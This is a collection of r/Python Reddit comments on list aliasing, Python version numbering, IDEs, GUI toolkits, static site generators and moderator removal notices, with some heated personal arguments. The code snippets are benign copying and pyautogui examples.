Python needs CSP. Erlang has a good approach. Also please read. [https://www.python.org/dev/peps/pep-0554/](https://www.python.org/dev/peps/pep-0554/) The project I would love to work on is to write python light wait processes on top of the ERLANG messaging system. &amp;#x200B;
brackets?
I think you'd love reading through of the weirdness in [wtfpython](https://github.com/satwikkansal/wtfpython)
r/learnpython
Just use b=a[:] to make a copy
They have a sprint and week long meetup planned looking at 3.7 amongst other things if I'm not mistaken. 
You shouldn't anymore than you should avoid calculators while learning mathematics. 
They don't do semantic versioning. Like the Linux kernel it's just a release number, and the core devs and/or Guido decided to go to 4.0 after 3.9. CPython is so large no one could meaningfully guarantee semver anyway. Every minor release contains some backward incompatible changes (deprecations, new keywords, C-API and ABI).
I'd personally slightly restate the advice as follows: This is the result of both variables being different names for the same object. Python variables are simply key strings in a Python dictionary, with an object as their value: a = b = [1,2,3] # Create a list, assign two names for it assert id(a) == id(b) == id(locals()['b']) # One list object only, w/ multiple names, stored in a dict print(locals()['a']) # Variable names are just string keys # [1, 2, 3] One object was created, and both 'a' and 'b' are names for the same object. &amp;#x200B; Now create a copy of the list object by slicing, and assign it over an existing variable name/key: a = a[:] # This creates a new list object by completely slicing the original. Variable b is still a name for the original list assert id(a) != id(b) # Now 'a' and 'b' are names for different objects (with identical content) assert id(locals()['a']) != id(locals()['b']) # Same assertion as above a.append(5) print(a, b) # [1,2,3,5] [1, 2, 3] # 2 objects, each with a different name
Thanks dude! That looks indeed interesting.
What would go in that? We kindly ask beginners to seek help in /r/learnpython, which is dedicated to that.
Thanks, that illustrates it even better!
Seems you already got your answers, but you should also head over to the welcoming community at /r/learnpython !
Depending on the type of API you're building, I'd recommend Hug (http://www.hug.rest), which is built on Falcon. The two features I use most are 1. Automatically generated documentation and 2. Adding interface support (eg. CLI or REST) through decorators. 
Ahhh gotcha. Thanks for the reply.
It took 8 years for all my dependencies to be updated. It’s not as bad as you make it sound. Projects like wx took the time to also do major refactors. Also, until python 3.5, python 3 was worse than python 2.7 outside of sane unicode, so it’s more like 5 years. Shoot, even the PSF recommended that you not use python 3.0 and 3.1.
Yes
I’ve heard that claim, but then why even go to 4? Why not just follow semantic versioning like they more or less have been doing?
Personally, speed or raw performance is of little concern to me (I mean, unless it's dead slow) because I will scale via infra/ops (more instances behind a reverse proxy for example) or a different architecture (microservices). What is more important to me is the ecosystem and it seems to me Flask is winning there. You can always adapt an existing library to your framework of choice but it is good when it's maintained by someone else. For instance, I have paid great attention to [starlette](https://www.starlette.io/) but its ecosystem is too limited for my need unfortunately.
I think the biggest backwards incompatibility I hat all the future options will be on.
I doubt it. It didn’t last time and if it did, it’d probably be small.
Wow great write up! Calling GC every frame is a bit of a cludge though. The more consistent frame rate than Cpython makes it worth it though.
Python isn't semver.
[http://www.pythontutor.com/](http://www.pythontutor.com/) is a nice online visualizer that you can use to get some insights into what happens behind the scenes when executing code &amp;#x200B;
I didn’t say it was. It follows it for most part for non-C aspects though. Still, why go to 4? Just because you don’t like 3.10?
No one says this except Zed Shaw and dumb vim users, so just ignore them.
There are plenty of resources in the sidebar. 
"Mostly" semver is like "mostly" pregnant. Either it is, or it isn't. As for why 4.0 rather than 3.9, I have no idea about. Probably because we need something to be angsty about, come 9.9.9 
 Because programmers have a god complex and don’t need IDEs. Heck if the computer could read from a sheet of scratch paper I wouldn’t even use emacs. 
Wow that's amazing! I will be certainly using this site a lot.
Yes, it fails the binary, but it’s a spectra. You can break APIs during bug releases or minor releases. Is change x classified as a big enough feature to justify a major release or is it a minor release? There is a lot of grey in semver. Obviously, the next logical number is 11.0.
Well... it might be just me of course but... I find that *kind ask* you refer to &amp;#x200B; \- is somewhat too far down on the page to get noticed \- has a title (*"1. belongs in* /r/learnpython*"*) that is maybe not the clearest title ever
I would use Pyautogui, for me it is much easier to use and great documentation. https://pyautogui.readthedocs.io I have already done something similar to what you want to do, I adapted this code from the Pyautogui docs. ''' Open a desktop program, Notepad.exe in this example, and interact with it using Pyautogui. You may need to "pip install pyautogui" if not already installed ''' import subprocess import time import pyautogui # Run Notepad. subprocess.Popen('notepad.exe') # Give Notepad a chance to open. # You could increase this pause if any problems catching window focus. time.sleep(0.2) # Tell Pyautogui what the windows name is. WINDOW = pyautogui.getWindow("Untitled - Notepad") # Focus on Notepad and bring to front. WINDOW.set_foreground() # Test it out # Hit F5 to print time and date pyautogui.hotkey('F5') # Newline (the "\n" bit) and print a message. pyautogui.typewrite('\nHello auto bot world') For more info on this, see my blog at: https://stevepython.wordpress.com/2018/11/04/python-code-snippets-8 
This is the video for you https://www.youtube.com/watch?v=_AEJHKGk9ns&amp;feature=player_embedded
It's at the very beginning of the sidebar: &gt; News about the dynamic, interpreted, interactive, object-oriented, extensible programming language Python &gt; &gt; If you are about to ask a "how do I do this in python" question, please try r/learnpython, the Python discord, or the #python IRC channel on FreeNode. Common reddiquette is to check the sidebar of a sub before posting in it, so it can hardly be more visible.
I also feel like he's misunderstanding what the visitor pattern is and what problem it solves.
Like I said, it might be just me... Using the new styling, on the side-bar I * first have a *community details* block where I can subscribe/unsubscribe and **create a post** * next an advertisment * only then the r/Python *rules* block (and I have to scroll down to see it) I would argue this UX design does not nudge people to naturally adhere to the reddiquette &amp;#x200B;
This terri-able! I mean terrific! 
That is the standard Reddit layout. Every sub have a similar place to search for the sidebar content, so it's hardly an excuse. 
Is your GF a rubber ducky?
Hello! I'm a bot! I see someone has already suggested going to r/learnpython, a sub geared towards questions and learning more about python. I highly recommend posting your question there. Please follow the subs rules and guidelines when you do post there, it'll help you get better answers faster. Show /r/learnpython the code you have tried and describe where you are stuck. **[Be sure to format your code for reddit](https://www.reddit.com/r/learnpython/wiki/faq#wiki_how_do_i_format_code.3F)** and include which version of python and what OS you are using. You can also ask this question in the r/Python discord: https://discord.gg/3Abzge7, a large, friendly community focused around the Python programming language, open to those who wish to learn the language or improve their skills, as well as those looking to help others. *** [^(README)](https://github.com/CrakeNotSnowman/redditPythonHelper) ^(|) [^(FAQ)](https://github.com/CrakeNotSnowman/redditPythonHelper/blob/master/FAQ.md) ^(|) ^(this bot is written and managed by /u/IAmKindOfCreative) ^(This bot is currently under development and experiencing changes to improve its usefulness)
Hey can I see your tkinter code for alternating list/item colors in a ttk treeview?
Thanks!
Can you show an example where the GoF iterator pattern solves something that cannot be solved with `__next__`?
Now he's back online :)
No, it wouldn't. Read about mutable objects and the meaning of assignments. You will be even more surprised by the gotchas arising from using mutable objects as default values for function arguments. 
Thanks for the shout-out. I hope he enjoys the blog. I actually know Tom too as he goes to the local Python users group. 
Yes I'm the author and I don't expect to get sued for liability honestly. The license is just a generic public domain license. I know regex is usually shunned to parse HTML, but for what's required here I think it's . I don't think I implied it supported HTTPS anywhere? I might add support for it in the near future though. I'll definitely have a look at the issues you mentioned though, it's pretty valid criticism. I'm just not sure what the issue with the os module is? The reason I made this in the first place is just to see if I could and get some feedback (not just on code but usability and possible features too). There isn't really a way to state that when posting links though.
making scripts which register accounts to different social media’s i’ve made an instagram one so far , only trouble is that instagram bans your mac address or something like that from making accounts for a day if you make too many. i also made an email spammer, changes subject each time so that it actually floods the email , doesn’t just all form into one email. pretty proud of it considering i just started learning a week ago. 
I did read it. And I have a project that uses it. No issues.
i use pynput and pyautogui for keyboard and mouse simulation if that’s what you are looking for. it’s pretty simplistic and will get anything you want done. 
No it won't. I know about pyautogui, but I need the code to work on different computers with different display resolutions. And it should also work if the window is moved to another location... 
ah , well i don’t know them. good luck 
If you would also want to copy a dict without additionnals imports, this is helpful: [https://writeonly.wordpress.com/2009/05/07/deepcopy-is-a-pig-for-simple-data](https://writeonly.wordpress.com/2009/05/07/deepcopy-is-a-pig-for-simple-data) &amp;#x200B; For Python 3: def copyDict(dictionnary): out = dict().fromkeys(dictionnary) for key, value in dictionnary.items(): try: out[key] = value.copy() # dicts, sets except AttributeError: try: out[key] = value[:] # lists, tuples, strings, unicode except TypeError: out[key] = value # ints return out &amp;#x200B;
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
I've been working on my metadata analysis tool - the idea behind it has been to grab absolutely any and all metadata from any file type and display it as best as possible. It also does offline geocoding which I'm especially happy with. The coding itself hasn't been bad due to some fantastic libraries (Pandastable I'm looking at you!) and I've managed to put in functionality that I've been wanting for a long time. Really, this is the first program I've created that's done something I *needed* rather than just something I vaguely, sorta wanted. Packaging it has been an absolute nightmare though - anything other than Pyinstaller just doesn't play well - I'd love to use nuitka but it's just not playing ball :( **Links:** [http://www.metadataanalysis.com](http://www.metadataanalysis.com) (note, I've distributed this as a closed source exe - I'll be putting it as open source if I stop active development) 
I have 3 things I am working on at the moment. I am working on a personal discord bot using the [discord.py](https://discord.py) module, working on a statistics series for my new business using python, and I am working on improve a screen cap program I wrote a while back.
I'm the author of this article. Feedback very welcome :).
Looks great, are you the creator of this? From the demo site, it'd be great if the child pages could be folded under the parent - I can imagine the sidebar would get very, very messy if you had a lot of files!
I'm busy trying to make a script to return the latest 5 videos from each of my subscriptions on YouTube using the requests and lxml modules. 
sounds cool!
There's nothing wrong with the **os** module, but **os.system** has a line at the bottom of its docs that says "use **subprocess** instead of this function" for a reason. If you're interacting with external processes you likely should be using that. You implied HTTPS in one of your comments, near the bottom. You also have one header in your GET handler in which you put a hardcoded HTTP value for Location, but in the POST handler it's an HTTPS value, again hardcoded. Since no doubt most sites of interest will redirect HTTP to HTTPS and browsers will flag or disallow cross-traffic I'd say you'd want that as a minimal feature pretty quick. As for parsing, personally I don't think avoiding external dependencies is worth a brittle solution; besides, you've got an implicit external dependency on wget already. I'd suggest you'd be much better of embracing the dependencies and making your both package pip-installable and more robust. Then you could use **prompt-toolkit** for instance and make your user interaction _much_ more robust while also allowing you to concentrate on things other than coloring print output. And, to the license; no one _expects_ to be sued for liability... but someone successfully spearfishes a President stupid enough to click on anything served by `foxn.ews.real` and you still will be. A tort is a tort, even if you wave your hand at the idea that you disclaim responsibility for anyone actually using the loaded gun you left on a table beside a sign that said "free to a good home".
Can we just get rid of python2?
Well at that point it was the first upheaval of it's kind for Python devs. If it were to happen again a lot of people would likely lose confidence. Not saying it would be a death blow by any means for Python th ough.
Sounds like the type of person who says &gt; I'm just honest. As a way to excuse their assholeish nature.
Cooool!!
It was about time
The fact that the video is clear and that their voices are easy to hear and understand points to having a decent microphone, camera, and video editing setup. Also, I would speculate that this person wrote down the gist of what they wanted to say and show in each video, so they need to outline their work anyway.
FAQ should address the difference from Pelican and the million other static site generators. Writing a SSG is fun! I've done it in Python before myself. But there's no point in releasing what you write if you don't explain why to use your thing and not one of the million alternatives.
Nice joke😂
A and b both refer to the same list in memory in the first example When you do .append() it changes that list in place, meaning the list both are referring to has changed. In the second example a = b and then b = that list so both refer to the list but then you set a to another list which means it stops refferring to the same list. when you write a list out like that and manually set it with = you are creating a new list
You consistently remind me why I have you tagged as "Toxic"
Indeed you can do this with aiohttp. It may be good also to check web sockets as it is better for such purposes: https://docs.aiohttp.org/en/stable/web_quickstart.html#websockets If you are not familiar practically with asynchronous programming check blogs and official documentation for asyncio (standard library) and go for python&gt;=3.6.
Marry her.
Why would someone do that though? I mean downloading python from the website is simple enough. Cool concept though.
I frequent /r/PHP and I'd say for the most part people are blunt but not dicks. Though there's a few resident users who are definitely dicks.
Yes, everyone else is the problem 
One reason why would want to stay away from IDES: Job interviews. Some top companies including Google, expect you to write code on whiteboard. IMHO, you should at least be able to write syntax error free code without IDE. You don't have to remember each and every method and class names. 
Looks great ! I was looking for a minimal markdown theme, will give this a shot!!
You're taking user supplied input and passing it right to the shell. At the very least you should be using subprocess and passing the arguments as arguments, rather than just interpolating them into the string going to the shell.
I bought Fluent python a week alone and it's going to arrive at january 8! I can't wait :)
From my initial comment: &gt; I get zero utility from most of the videos, **even with the captions turned on**. It's not just this redditer's videos I am talking about, it's videos for programming languages in general. They're impossible to skim to see what it covered and in what detail, so I avoid them. I did attempt to view the specific video in question, but the format really isn't my thing. For those of you who enjoy it, great. I hope the author continues to make more of them as it seems he really enjoys it as well. Contributing in any way you can to a community you enjoy should be encouraged. Constructive criticism is the "good cholesterol" of feedback.
I hope to convince you that GCRA is a simple and elegant algorithm to use for rate limiting, and I've included a snippet of Python that implements it. (I'd argue that any service should have rate limiting protection, especially if publicly accessible).
Does it support reStructuredText?
you can develop in nano or notepad, but it really helps you using an IDE because it has extra functionality, you have extra features, let's say you want to use git, you have an interface for that, you want bash control, you have plugins for that, you want to have access to interpreters on different machines, then you can connect through ssh, for example. Also, if you're working with a large scale project, you want to see function definitions straight away without having to manually searching through the whole project. And many more of course, what I am saying is that once you get the basics of Python, you can move on to using a more complex IDEs. I am a linux guy so on that side I can recommebd Pycharm or VSC, they are really good for debugging, which helps a lot. I am pretty sure you got them on Windows or MacOS as well. Anyway good luck with learning Python :) 
Please make a post when it's ready!
This is similar but more sophiaticated. You write tasks in pure Python and then execute them. With or without params.
I use safaribooks (through work). I think it costs like a 1000$ a year, but ypu have access to a lot of info
When the Brython files are installed in a directory (by `python -m brython --install`) you have something roughly similar to a virtual environment. Then if you want to install to this Brython instance a package that has been installed in your CPython instance by pip (eg `pip install attrs`), run `python -m brython --add_package attrs`. By the way, attrs is actually supported by Brython ; I don't know to which extent it can be considered as "basic tasks or data manipulation". There is currently no more advanced support for dependencies, but it could be discussed in the issue tracker. &amp;#x200B; &amp;#x200B; &amp;#x200B;
Last I checked, it was $400/year.
I know a few friends starting learning Python who were in exactly the same boat - one of them said pretty much exactly what you did! (needing to be financially committed etc.). Unfortunately after a little bit of looking round on his behalf I couldn't find much that seemed better than the free tutorials/youtube. There are some Python Udemy courses (which are paid for) which might be alright, but I've found Udemy courses pretty poor in the past - there's a lot of padding in them. You would probably be better getting something like the ORilley Python Cookbook and then committing yourself to doing a part of free tutorials each day. 
So, I have a degree in CS and work 50-60 hours a week busting my ass for my company where I own like 40% of the stack and work pretty closely with the business to solve issues, I'm not some slacker my friend... but you know, you got me pinned. I use an IDE so I guess that makes me a slacker sports fan with poor email etiquette, who tries to solve business issues with the stakeholders instead of cowboy coding my idea of right. If you were one of my engineers, you would be the first to go my friend, you have a bad attitude. 
I would suggest the intro Python courses (2) by MITx on [edx.org](https://edx.org) . The verified version is around (double check, I don't remember for sure) 50$. The first course assumes no programming background, it does however assume a serious commitment (12-15 hours / week). Good luck 
But I agree that without controlling what happens while using this feature, it could cause unintended issues. Thanks for mentioning them. No worries.
A lot of GIS people got stuck with a bad integration with arcmap 32bit. This cramped everything
Nice writeup, however some criticism - your figure is really bad. Many readers will skim short articles and focus in on the figure(s). Unless your figure tells a completely clear story, you will lose interest. If I'm a skimming reader, and I jump to your figure, I have no idea what the variables mean. `time` is clear, but everything else is not. *A good figure shouldn't only be understandable by people reading along, but should capture attention and make people want to read the work*. In this case, representing the variables in your figure with something more meaningful, like an entire word or shape, might make it more readable. Anyway, just my 2 cents. Like I said, I enjoyed your post overall.
Uh-oh, looks like you accidentally linked to a half-assed blog post instead of [the actual search engine](https://toolbox.google.com/datasetsearch)
Thanks, I've expanded the caption to help. I'll have a think about a better overall figure.
They always say: necessity is the mother of invention. Point being: find something you need done, and write something to do it! Better yet if it’s complex enough to rise above simple functional scripting to something more complex itself. So: what do you need doing?
I've already got my ticket! This will be my first time going. As a beginner I don't know what to expect. Some of the topics looked really interesting and others I couldn't wrap my head around... What are some things that you'd recommend for a first-timer? 
Hi there, this post has been removed as it is not directly related to the Python programming language. It might be more topical on /r/programming, /r/coding, or /r/technology. Cheers, /r/Python mods
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
/r/learnpython
Thank you I will check that out.
Sentdex on youtube :D
PEP 8 has nothing against using parentheses for logical operators. I ain't doing nothing against the law copper.
Bud. GO through and read some of the stuff I say to people - to good people. I love nothing more than building people up. I'd like to see a lot more of you follow suit. Few of you do - QUITE on the contrary 
Yeah, I can see how you could see me as toxic. But you know know me, that's the difference. Everyone who know me knows I put everyone else in front of myself --- if they're at least decent people. Difference if: I know you people and how you act. Better than almost anyone out there are by a very long shot. Something to be noted. &amp;#x200B; Don't know if you saw I recruited IT for 6 years before I started programming. I've seen enough to know what's what in a very confident way.
1. Read using pandas (https://pandas.pydata.org/pandas-docs/stable/generated/pandas.read_excel.html) 2. Make plot using matplotlib (https://matplotlib.org/) and save to disk using `fig.savefig()` or `plt.savefig()` 3. Load from disk and display in tkinter (https://stackoverflow.com/questions/44505196/how-to-display-an-image-using-tkinter-in-gui) 4. Profit 🏀 🏀 🏀
I have no doubt that is how you see yourself.
Thank you all for the leads! I will look into all of these!!
I like how it shows variable values, very useful.
Couple of recos: * Go to a mix of talks intended for different levels - intermediate, beginner, etc. I find that my universe expands the most when I go to a talk that is totally out of my comfort zone, even if I don't immediately understand anything. * Hang out with other conference-goers on Saturday night. There's usually people playing games. I went out for hot chicken and beer with some Atlanta folks (and became friends with the person who is the chair of this year and last year's pycons - awesomely nice). * Keep your eyes out for good free Python books; I've gotten an abnormal number at this conference. &amp;#x200B;
This sounds so cool. How did you even go about making that? 
think of it this way: if they ever get a job as a programmer, most of their colleagues will be highly critical, opinionated, dickish or incompetent or some combination of thereof, for that reason, encountering it here is a good start to getting used to that stuff.
Will do. It's mostly working just need to tidy it up a bit. I did end up switching to beautiful soup though 🙈 I was really struggling to understand lxml. 
Actually not bad, I'm tough to please on this stuff but I think this is good. 
ok thanks. i need to google what virtual environment is.
Latest PyPy nightlies also support the scientific stack (SciPy, Numpy, pandas), although you need to roll your own packages from source. Worth giving it a try to see if it speeds up your code.
An AI to suggest things for you to make.
/r/learnpython and https://discord.gg/3Abzge7
I recently just started use Tinkerer. What advantage Ivy have over Tinkerer?
This was also the top comment when it was [originally posted](https://www.reddit.com/r/Python/comments/6q2o59/ivy_a_minimalist_static_site_generator/) to r/Python.
&gt; What is the best option if I want to create something quickly, but with lot of customisations and with a beautiful user interface (material design for example) ? Based on the these parameters you'll find [PySimpleGUI](http://www.PySimpleGUI.org) appealing. You can build custom layouts quickly. The "beautiful user interface" is going to be up to you and the amount of time you spend on graphic design. Minimally you'll want to create custom button images.
What I like the most is that you have a code block with highlighting. It still annoys me that this isn't built into Wordpress.
Not sure how often I'd be able to participate, but I love this idea
/r/pythonshitpost
Dude thank you so much for the kind words! Short answer: look and see what public api's i can use that do what i want. Long answer: So i started by checking if groupme had a public facing API and luckily they do. If they didn't i might have had to something else like download the html and parse through it. Since groupme had an api i could use, i followed the documentation to pull back messages and searched through them looking for any message that had an attachment key in the json response. Then i saw that within that json response it contained another object with the key 'type' containing the values of 'image' or 'video' and A 'url' key which contained the url for the resource that groupme used to store that particular media item. After that i looked into what was in the python standard library to download remote files and luckily something existed and that was urlretrieve, which was in the urllib library. So thats how i was able to able to get all the videos and pictures and a group chat. Once the files were downloaded i then looked into the google photos api and followed a similar pattern of how to make an album, add photos to that album and so forth. This part is bugged out though bc google photis api is broken and only creates the album but won't add any of the media. So i'm considering trying to add the photos to google drive instead. So yeah thats how i did it haha. Hope this helps. 
Maybe just a sticky that tells people to go to learnpython and any other rules that the sub has. I don't often reddit on my phone, but I think that stuff is less visible on the phone than on the web.
The current stable already support it I think.
did you embed a pygame into your pyqt UI? Or how did you handle graphics?
This looks very much like homework. If you want help, /r/learnpython is happy to help, but we really don't like when you ask someone to do your homework for you. To get help, you should provide a *specific* error or question, what code you've tried, what ideas you have, etc. People either won't answer your open ended questions like "here's my homework help/do it", or will just end up having to ask for more details. TLDR: read sidebars, don't ask us to do your homework, give much more detail, read sidebars
And read the sidebar before posting there.
Normally I do but on mobile currently
It's so much scarier when you read his bio and discover that he has a PhD in computer science! Somehow he's never heard of a list though....
&gt; I'm sorry but... USE AN IDE or a beefed up text editor. Heck, if you just start the CPython REPL you can type help(). After a little help message you learn that you can just type "modules" and it'll show you a list of all modules the REPL can see and you can get help on them from there. 
I started my 2019 Extra Life campaign (raise money for Children's hospitals from donations when playing video games - [http://extralife.ericmesa.com/](http://extralife.ericmesa.com/) ) . I have a python program that grabs JSON data and writes it to text files so that I (and others who use the script) can use it with OBS or XSplit to overlay the data on their stream - [https://github.com/djotaku/ELDonationTracker](https://github.com/djotaku/ELDonationTracker) . This year was the first time I run it without any donations so I discovered I didn't handle that situation (ended up with divbyZero error) and had to correct that. Some time this week or in the next couple weeks, I'm going to be refactoring the code to be OOP instead of procedural to make it easier to work with it from within a GUI. &amp;#x200B; I've also moved my /home directory to a smaller SSD and now my btrfs snapshots are taking up too much space (2 day's worth takes up 200GB - not sure what kinds of file writes are happening, but there you go). So I need to modify [https://github.com/djotaku/Snap-in-Time](https://github.com/djotaku/Snap-in-Time) to be more aggressive in snapshot deletions. I'm most likely going to have it be a separate script for those with smaller HDDs while leaving the older one alone. At some point I should probably convert it to Python 3, as well.
It's weird that it's not even the standard gripes about unicode or the GIL or self or speed. It's complaining about something being called a list, yet the author has a PhD in computer science. 
And? Google the name of your reddit app + sidebar.
Python's lists aren't lists?
Meta AF
Sorry I won't make that mistake again
Well, maybe you are also not a slacker when it comes to playing video games with friends, you put yourself out there! But who really cares? When it comes to programming you are a slacker. Maybe you are a good manager, or a good owner of your company's stack, whatever that means, but you aren't good as a programmer, by your own admission.
Wow, thank you so much!!!
I didn't realize that packages were available for download offline in pypi and you could install their files using PIP. It was messy but I was finally able to get it working, Thx for the help everyone
&gt;OK so anyway I got some software for something. Ok so anyway the best thing you can do in this case is to add something to do the something you want that something to do. Or something. OR, you can tell us more about the software you're doing this in. Your choice. That looks like it might be selenium webdriver, but I could be wrong. None of us are gonna want to guess at what you're doing- so you'll need to provide more detail. considerably more. 
A major version increment with no breaking changes is entirely compatible with Semantic Versioning. Major versions "MAY include minor and patch level changes". Semver only specifies that the version is "increased numerically", the next Python version could be 3.1337 for all it cares. https://semver.org/#spec-item-8
I thought this was something that is universal in the python language. I just wanted to know how to add an ''enter break'' between those lines. &amp;#x200B; It's to send messages over FB. Don't know about the driver, but there's a file called geckodriver so that might help.
You don't need to learn reactjs .. sounds like an overkill. Flask + Bootstrap 4 or any other css framework will do the job. Also if you use github with frozen-flask you can have it online for free.
Sounds like what we have to do in unity and c# to get a stable frame rate.
Windows OS needs nightlies
I haven’t tried it with sendkeys but try using /n at the end of your sting like (“blah/n”)
I wanted to step in address your last point. Visual learners would benefit from video instruction better. I had a very tough time in university because I needed to visually see something in order to internalize it. I see nothing wrong with having different resources for different individuals, and it is easy enough to have someone transcribe the video for accessibility purposes. 
As in: actions.send\_keys('dummy/n') actions.send\_keys(Keys.RETURN) actions.send\_keys('data') &amp;#x200B; ?
Okay dude seriously just stop. You're trying to argue a fucking dictionary by saying. &gt; Don't know if you saw I recruited IT for 6 years before I started programming. I've seen enough to know what's what in a very confident way. So with respect your IT recruiting experience can go where everything else that you've been saying is coming out from. Your ass. You can recruit IT for 30 years. No one will care. Not to mention being an IT recruiter doesn't even necessarily mean you have any technical experience whatsoever. Stop fighting a dictionary and stop trying to prove yourself on the moral and ethical mountain. With the first everyone knows you're wrong. With the second, good for you...but nobody actually gives a flying fuck.
I made this post in the other thread, but there exist individuals who have trouble understanding concepts through text. A video means one could show those concepts instead of writing them. For example, I could show how to add Python to your Path in a video faster than you could explain it. As an undergraduate teaching assistant, we provide content in lectures, articles, and videos for maximum accessibility, especially when working with students new to programming.
Are there recommended hotels near the venue?
Hey kid, I won't be that douche tlaking money - but I'll say I cleared 6 figures easily every year. WHy? Becuase I understood you guys. I knew what to look for. I knew the type of techie I was gonna get a call about 2 months down the road from my client: "Yet another techie who thinks he's smarter than his manager and has too much pride to know his/her place. Sorry, Aaron, but let them know they're last day is today." I give a SHIT if anyone cares about my career. Why on EARTH would anyone in the first place? My point is that I made a lot of money working countless hours sifting through the douche bags that make up 90% of the IT industry. I'm an expert on you. I know how you think and I know your bullshit antics. When you're see if 60 hours a week for 6 years, nothing can describe the experience but uncanny. Little more background to give some insight: I've have probably 10 of these pissing matches over this one post and another where I was defending a dude who put up a tutorial video, that was actualy VERY, very good, and sure enough: you all came in scores to berate him. I resent you all for that constant shit. Probably because I'm the opposite. So, you could say all this is brought on me. In a vacuum of 2 simple posts, yeah, seems bullshit. I kick shit into your faces as much as I can because I'm weary of your grotesque, pompous attitudes. ANd I will let you hear it. Every.Time. &amp;#x200B; &amp;#x200B;
PyQt5 in my opinion is worth checking out.
I'm wondering if it would make sense if PyPy would call some callback if it thinks a gc run is in order and then one can schedule a collection in an async event loop.
Yeah, I see "works for me" idiots every day. Welcome to the club.
For sure, an all-in-one, ready-to-go program is a super-fast way to get moving. You're just at the mercy of the IDE's opinion and you're adding, at least, a third thing to learn--the IDE. To play Devil's advocate, all you need is the Python interpreter and a way to edit text files. I think that's the idea--boil it down to essentials and learn the fundamentals. Maybe it's best that you throw yourself into the deep end and simply get a "Hello World" script working with the barest environment. Install Python, open a text editor, create the file and run it. And the deep end isn't all that deep. Linux: some-package-manager install python edit file python file Windows: 1. Download and run installer. 2. Edit file. 3. Double-click file or run `python file` in a console. Something doesn't work along the way? That's an excellent learning opportunity. How do I get a terminal or console? Or `python command not found`, why is that? I think what is meant, is learning the fundamentals. [You throw the ball, you hit the ball, you catch the ball.](https://www.youtube.com/watch?v=Svwa8nDdE6Y) A simple game but you must master the fundamentals and forgoing an IDE might speed you along that way. And, besides, you can always do the hard way later. How interested are you, how much work do you want to do?
I prefer [wxPython](https://wxpython.org/). It has tons of built in widgets and a super nice community. Next up would be [Qt for Python](https://www.qt.io/qt-for-python) or PyQt
